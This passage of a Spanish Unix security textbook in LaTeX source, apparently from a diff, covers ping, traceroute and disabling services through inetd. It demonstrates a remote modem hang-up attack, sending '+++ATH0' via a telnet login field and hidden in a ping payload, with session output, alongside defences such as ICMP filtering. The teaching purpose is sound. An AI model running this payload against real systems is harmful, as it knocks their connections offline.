+situaciones, existen casos en los que se puede utilizar como un arma -- 
+efectiva -- para atacar sistemas; por ejemplo, uno de los ataques m\'as 
+conocidos es el {\it Ping Flood}, consistente en saturar una l\'{\i}nea lenta 
+con un n\'umero de paquetes {\sc icmp} suficientemente grande. Esta 
+saturaci\'on causar\'a una degradaci\'on del servicio importante, incluso la
+desconexi\'on del sistema si se ataca una l\'{\i}nea telef\'onica (un objetivo
+muy habitual para los piratas). En este \'ultimo caso, el de conexiones 
+telef\'onicas, otro ataque com\'un -- no directamente relacionado con {\tt
+ping}, pero en el que se usa esta herramienta como base -- consiste en enviar
+una trama `especial' a un {\it m\'odem}, oblig\'andole a finalizar la llamada:
+los {\it m\'odems} conmutan a modo comando cuando reciben la orden {\tt `+++'}, 
+y muchos de ellos lo hacen tambi\'en al recibir remotamente esta secuencia de 
+control. 
+As\'{\i}, podemos conectar a un puerto donde se ofrezca determinado servicio
+(como {\sc ftp} o {\sc smtp}) en un {\it host} con un {\it m\'odem} de estas 
+caracter\'{\i}sticas y colgar el {\it m\'odem} remoto sin levantarnos de la 
+silla, simplemente enviando la cadena {\tt `+++'} seguida de una orden de 
+colgado como {\tt `ATH0'}:
+\begin{quote}
+\begin{verbatim}
+luisa:~# telnet XXX.XXX.X.XX 21
+Trying XXX.XXX.X.XX...
+Connected to XXX.XXX.X.XX.
+Escape character is '^]'.
+220 gema FTP server (Version wu-2.4.2-academ[BETA-15](1) Fri Oct 22 
+00:38:20 CDT 1999) ready.
+USER +++ATH0
+^]
+telnet> close
+Connection closed.
+luisa:~# telnet XXX.XXX.X.XX
+Trying XXX.XXX.X.XX...
+telnet: Unable to connect to remote host: Network is unreachable
+luisa:~#
+\end{verbatim}
+\end{quote}
+Bien pero, >d\'onde entra {\tt ping} en este ataque? Muy sencillo: al conectar
+a un servicio para enviar la cadena de caracteres, lo habitual es que el sistema
+remoto registre la conexi\'on, aunque luego su {\it m\'odem} cuelgue. En 
+cambio, muy pocos sistemas registran en los {\it logs} un simple {\tt ping},
+por lo que esta orden se convierte en un mecanismo que algunos piratas utilizan
+para no dejar rastro de sus acciones; esto se consigue de una forma muy 
+sencilla: en la utilidad {\tt ping} de la mayor\'{\i}a de Unices existe un
+par\'ametro que permite especificar el contenido del paquete enviado (por 
+ejemplo, {\tt `-p'} en Linux), por lo que simplemente hemos de insertar (en
+hexadecimal) la cadena {\tt `+++ATH0'} en la trama que enviamos al sistema 
+remoto:
+\begin{quote}
+\begin{verbatim}
+luisa:~# ping -c 1 XXX.XXX.X.XX
+PING XXX.XXX.X.XX (XXX.XXX.X.XX): 56 data bytes
+64 bytes from XXX.XXX.X.XX: icmp_seq=0 ttl=255 time=0.2 ms
+
+--- XXX.XXX.X.XX ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 6.5/6.5/6.5 ms
+luisa:~# ping -p 2b2b2b415448300d XXX.XXX.X.XX
+PING XXX.XXX.X.XX (XXX.XXX.X.XX): 56 data bytes
+
+^C
+--- XXX.XXX.X.XX ping statistics ---
+1 packets transmitted, 0 packets received, 100% packet loss
+luisa:~# telnet XXX.XXX.X.XX
+Trying XXX.XXX.X.XX...
+telnet: Unable to connect to remote host: Network is unreachable
+luisa:~#
+\end{verbatim}
+\end{quote}
+Para evitar los problemas relacionados con los paquetes {\sc icmp} que sistemas
+remotos puedan enviar a nuestra m\'aquina puede ser conveniente filtrar 
+dicho protocolo mediante un cortafuegos (incluso situado en el propio equipo); 
+si no tenemos esta posibilidad, al 
+menos es interesante registrar las tramas de este tipo que llegan hasta nuestra
+m\'aquina, con programas como {\tt icmpinfo} (si hacemos esto, hemos de tener
+cuidado con las negaciones de servicio ocasionadas por una cantidad de {\it 
+logs} excesiva en el disco duro).\\
+\\Ah, si es nuestro {\it m\'odem} el que presenta el problema que acabamos de
+comentar, podemos solucionarlo mediante la cadena de inicializaci\'on {\tt 
+`s2=255'}.
+\subsection{La orden {\tt traceroute}}
+Esta orden se utiliza para imprimir la ruta que los paquetes siguen desde
+nuestro sistema hasta otra m\'aquina; para ello utiliza el campo {\sc ttl}
+({\it Time To Live}) del protocolo {\sc ip}, inicializ\'andolo con valores 
+bajos y aument\'andolo conforme va recibiendo tramas {\sc icmp} de tipo
+{\sc time$\_$exceeded}. La idea es sencilla: cada vez que un paquete pasa por
+un {\it router} o una pasarela, esta se encarga de decrementar el campo {\sc
+ttl} en una unidad; en el caso de que se alcance un valor 0, se devuelve un
+paquete {\sc time$\_$exceeded} y se descarta la trama. As\'{\i}, {\tt 
+traceroute} inicializa a 1 este campo, lo que ocasiona que el primer {\it 
+router} encontrado ya devuelva el mensaje de error; al recibirlo, lo inicializa
+a 2, y ahora es el segundo {\it router} el que descarta el paquete y env\'{\i}a
+otro mensaje de error, y as\'{\i} sucesivamente. De esta forma se va 
+construyendo la ruta hasta un determinado {\it host} remoto:
+\begin{quote}
+\begin{verbatim}
+luisa:~# traceroute www.altavista.com
+traceroute to altavista.com (204.152.190.70), 30 hops max, 40 byte packets
+ 1  annex4.net.upv.es (158.42.240.191)  156.251 ms  144.468 ms  139.855 ms
+ 2  zaurac-r.net.upv.es (158.42.240.250)  159.784 ms  149.734 ms  149.809 ms
+ 3  atlas.cc.upv.es (158.42.1.10)  149.881 ms  149.717 ms  139.853 ms
+ 4  A1-0-3.EB-Valencia1.red.rediris.es (130.206.211.185)  149.863 ms  
+    150.088 ms  149.523 ms
+ 5  A0-1-2.EB-Madrid00.red.rediris.es (130.206.224.5)  189.749 ms  
+    159.698 ms  180.138 ms
+ 6  A6-0-0-1.EB-Madrid0.red.rediris.es (130.206.224.74)  179.518 ms  
+    159.678 ms  189.897 ms
+ 7  194.69.226.13 (194.69.226.13)  259.752 ms  249.664 ms  259.83 ms
+ 8  * * 195.219.101.1 (195.219.101.1)  290.772 ms
+ 9  195.219.96.34 (195.219.96.34)  1680.33 ms  1660.36 ms  1669.83 ms
+10  * 195.66.225.76 (195.66.225.76)  1660.68 ms  1650.33 ms
+11  core1-linx-oc3-1.lhr.above.net (216.200.254.81)  2009.88 ms  1970.32 ms *
+12  iad-lhr-stm4.iad.above.net (216.200.254.77)  2050.68 ms * *
+13  sjc-iad-oc12-2.sjc.above.net (216.200.0.22)  2440.89 ms  2170.29 ms  
+    2579.81 ms
+14  pao-sjc-oc12-2.pao.above.net (207.126.96.65)  2441.19 ms  2140.32 ms *
+15  mibh-above-oc3.pao.mibh.net (216.200.0.10)  2200.57 ms * *
+16  * * www.altavista.com (204.152.190.70)  1810.56 ms
+luisa:~#
+\end{verbatim}
+\end{quote}
+{\tt traceroute} se utiliza para realizar pruebas, medidas y administraci\'on
+de una red; introduce mucha sobrecarga, lo que evidentemente puede acarrear
+problemas de rendimiento, llegando incluso a negaciones de servicio por el
+elevado tiempo de respuesta que el resto de aplicaciones de red pueden 
+presentar. Adem\'as, se trata de un programa contenido en un fichero {\it
+setuidado}, por lo que es interesante resetear el bit de {\it setuid} de 
+forma que s\'olo el {\tt root} pueda ejecutar la orden: hemos de pensar que un 
+usuario normal {\bf rara} vez tiene que realizar pruebas sobre la red, por lo
+que el bit {\it setuid} de {\tt traceroute} no es m\'as que un posible 
+problema para nuestra seguridad; aunque con {\tt ping} sucede lo mismo (es
+un fichero {\it setuidado}), que un usuario necesite ejecutar {\tt traceroute}
+es menos habitual que que necesite ejecutar {\tt ping} (de cualquier forma,
+tambi\'en podr\'{\i}amos resetear el bit {\it setuid} de {\tt ping}).
+\section{Servicios}
+\label{serv}
+Los servicios ofrecidos por una m\'aquina al resto suelen ser uno de los 
+principales puntos de ataque contra esa m\'aquina; estos ataques pueden implicar
+desde negaciones de servicio (DoS, {\it Denial of Service}) m\'as o menos 
+graves hasta un acceso {\it root} remoto sin necesidad de ninguna clave.\\
+\\Hay dos formas b\'asicas de ofrecer un servicio: o mediante {\tt inetd}, o
+bien lanzando un demonio que se asocia y escucha en cierto puerto, generalmente
+en el arranque del sistema. Por norma general se recomienda ofrecer el 
+m\'{\i}nimo n\'umero de servicios; incluso si hay alg\'un servicio que no 
+sabemos para qu\'e se utiliza, lo mejor para nuestra seguridad ser\'{\i}a dejar 
+de ofrecerlo.\\
+\\Dejar de ofrecer cierto servicio en m\'aquinas Unix es muy sencillo; no 
+necesitamos {\it reiniciar el sistema para que los cambios tengan efecto} ni
+nada por el estilo: con un simple editor de textos podemos limitar los servicios
+ofrecidos. En el caso de servicios ofertados a trav\'es de {\tt inetd}, no 
+tenemos m\'as que editar {\tt /etc/inetd.conf} y comentar las l\'{\i}neas
+correspondientes a los servicios a cerrar (los comentarios en ficheros de
+configuraci\'on de Unix suelen ser lineales, utilizando el s\'{\i}mbolo {\tt 
+\#}). Despu\'es de comentar las l\'{\i}neas correspondientes hemos de reiniciar
+el demonio {\tt inetd} envi\'andole la se\~nal {\sc sighup} (con \'ordenes como
+{\tt kill}, {\tt pkill} o {\tt killall}). En el caso de demonios independientes
+lanzados durante el arranque del sistema no tenemos m\'as que enviarles la
+se\~nal {\sc sigterm} (por norma general, aunque en algunos casos quiz\'as es
+necesaria {\sc sigkill}), y tambi\'en editar los ficheros que lanzen estos 
+demonios y comentar las l\'{\i}neas encargadas de la inicializaci\'on, para que
+no se vuelvan a lanzar la pr\'oxima vez que la m\'aquina arranque; generalmente 
+se tratar\'a de archivos situados en {\tt /etc/rc.d/} o en {\tt /etc/rc?.d/}.\\
+\\Veamos un ejemplo: imaginemos que en nuestro {\tt /etc/inetd.conf} tenemos
+la l\'{\i}nea del servicio de {\tt telnet} que hemos mostrado anteriormente. En
+este caso, si alguien ejecuta un {\tt telnet} a nuestro sistema, ver\'a algo 
+parecido a esto:
+\tt
+\begin{quote}
+\begin{verbatim}
+rosita:~$ telnet anita
+Trying 192.168.0.3...
+Connected to anita.
+Escape character is '^]'.
+
+SunOS 5.7
+
+login:
+\end{verbatim}
+\end{quote}
+\rm
+Si esta l\'{\i}nea de {\tt /etc/inetd.conf} la sustituimos por 
+\tt
+\begin{quote}
+\begin{verbatim}
+#telnet  stream  tcp     nowait  root    /usr/sbin/in.telnetd
+\end{verbatim}
+\end{quote}
+\rm
+y a continuaci\'on ejecutamos {\tt pkill -HUP inetd}, cuando alguien haga un
+{\tt telnet} a nuestra m\'aquina ver\'a esto:
+\tt
+\begin{quote}
+\begin{verbatim}
+rosita:~$ telnet anita 
+Trying 192.168.0.3...
+telnet: Unable to connect to remote host: Connection refused
+rosita:~$
+\end{verbatim}
+\end{quote}
+\rm
+Demonios t\'{\i}picos que se lanzan desde {\tt inetd} son {\tt in.telnetd}
+(para recibir peticiones {\tt telnet}), {\tt in.ftpd} (para peticiones {\tt 
+ftp}), {\tt in.talkd} (para peticiones {\tt talk}), {\tt in.fingerd} (para
+{\tt finger} remoto) o {\tt in.r$\ast$}, para los servicios {\tt r-$\ast$} de
+Unix {\sc bsd}. Demonios que se suelen lanzar en el arranque del sistema
+son {\tt sendmail} (gesti\'on de correo electr\'onico), {\tt httpd} (servicio
+{\tt http}), {\tt lpd} (demonio de impresi\'on), {\tt inetd} (recordemos que
+es un demonio que tambi\'en se ha de iniciar en el arranque) o {\tt nfsd}
+(para compartir sistemas de ficheros mediante {\sc nfs}); algunos de estos
+conviene servirlos desde {\tt inetd} en lugar de como demonios independientes,
+por motivos de seguridad que ya veremos al hablar de {\it TCP Wrappers}.\\
+\\Hasta ahora hemos hablado de dos formas de ofrecer un servicio: o bien a
+trav\'es de {\tt inetd}, o bien como demonio independiente lanzado al arrancar
+el sistema; realmente, existe una tercera forma de ofrecer servicios, y es el
+mecanismo RPC ({\it Remote Procedure Call}), original de Sun Microsystems pero
+que en la actualidad est\'a implementado tambi\'en por OSF ({\it Open Software
+Foundation}) en su DCE ({\it Distributed Computing Environment}) y por OMG
+({\it Open Management Group}) en CORBA ({\it Common Object Request Broker 
+Architecture}). La idea b\'asica del funcionamiento de RPC es sencilla: existe
+un programa denominado {\tt portmap}, {\tt rpcbind}, {\tt rpc.portmap}\ldots
+(su nombre depende del clon de Unix utilizado) que los servidores RPC utilizan
+para registrarse. As\'{\i}, cuando un cliente desea utilizar esos servicios, 
+en lugar de conectar a un puerto determinado donde se encuentre el servidor lo
+hace al puerto del {\it portmapper}, que le indicar\'a la ubicaci\'on exacta
+del servidor solicitado. Como estos mecanismos pueden llegar a ser muy complejos
+no vamos a entrar en detalles de su seguridad; s\'olo decir que existe una
+versi\'on de {\tt portmap} desarrollada por Wietse Venema que utiliza un
+control de accesos similar a {\it TCP Wrappers}, lo que evidentemente va a ser
+muy \'util para nuestra seguridad: s\'olo permitiremos conexiones RPC a los
+sistemas deseados, denegando el acceso al resto. M\'as detalles de la seguridad
+de RPC pueden encontrarse en el cap\'{\i}tulo 19 de \cite{kn:spa96}.\\
+\\Cada puerto abierto en nuestro sistema representa una puerta de entrada al
+mismo, por lo que como hemos dicho, hemos de minimizar su n\'umero ofreciendo
+s\'olo los servicios estrictamente necesarios. Por ejemplo, si ofrecemos el
+servicio {\tt telnet}, cualquier persona, desde cualquier parte del mundo, 
+podr\'a acceder a nuestra m\'aquina simplemente conociendo (o adivinando) un
+nombre de usuario y su clave; si ofrecemos el servicio {\tt netstat}, cualquiera
+podr\'a consultar las conexiones activas de nuestra red simplemente tecleando
+{\tt telnet maquina.dominio.com netstat}, desde cualquier ordenador conectado
+a la red. Pero no s\'olo nos tenemos que limitar a cerrar servicios: hay algunos
+que, como administradores de un sistema, no vamos a tener m\'as remedio que
+ofrecer; en este caso es casi obligatorio restringir su disponibilidad a un
+n\'umero de m\'aquinas determinado, como veremos al hablar de {\it TCP 
+Wrappers}, y por supuesto utilizar la \'ultima versi\'on de los demonios
+encargados de procesar las peticiones: un demonio no es m\'as que un programa,
+y por supuesto es muy dif\'{\i}cil que est\'e completamente libre de errores. 
+Un error en el demonio que utilicemos para procesar una petici\'on puede 
+comprometer la seguridad de todo nuestro sistema, por lo que se recomienda
+estar atento a listas de seguridad (como {\sc bugtraq} o {\sc cert}) en las que
+se difundan problemas de seguridad y sus soluciones.
